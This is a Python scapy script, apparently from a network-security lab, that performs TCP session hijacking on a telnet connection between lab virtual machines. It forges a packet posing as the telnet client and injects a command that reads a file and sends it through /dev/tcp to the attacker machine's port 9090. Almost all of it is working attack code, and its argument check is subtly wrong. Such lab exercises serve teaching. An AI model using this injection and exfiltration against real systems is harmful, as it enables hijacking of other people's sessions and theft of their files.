'''TCP Session Hijacking [TELNET]
VM A 10.0.2.8 [TELNET SERVER]
VM B 10.0.2.7 [TELNET CLIENT]
VM M 10.0.2.6 [ATTACKER MACHINE]

We need the following fields of the last TCP packet sent from telnet client. 
- src ip, src port
- dst ip, dst port
- tcp seq. num
- tcp ack. num
- tcp ack flag
- tcp data/payload

Refer to wireshark to get the above details. 
'''
#!/usr/bin/python3
from scapy.all import *
import sys

SELF_MAC='08:00:27:bc:f5:3d'

if len(sys.argv) > 4:
	sys.exit('Usage: sudo python3 task4-telnet.py [SPORT] [SEQ] [ACK]')


SPORT=sys.argv[1]
SEQ  =sys.argv[2]
ACK  =sys.argv[3]

I=IP(src="10.0.2.7", dst="10.0.2.8")
T=TCP(sport=int(SPORT), dport=23 ,flags='A' ,seq=int(SEQ), ack=int(ACK))
data="\rcat /home/seed/examples.desktop > /dev/tcp/10.0.2.6/9090\r".encode()
pkt=I/T/data
send(pkt, verbose=0)
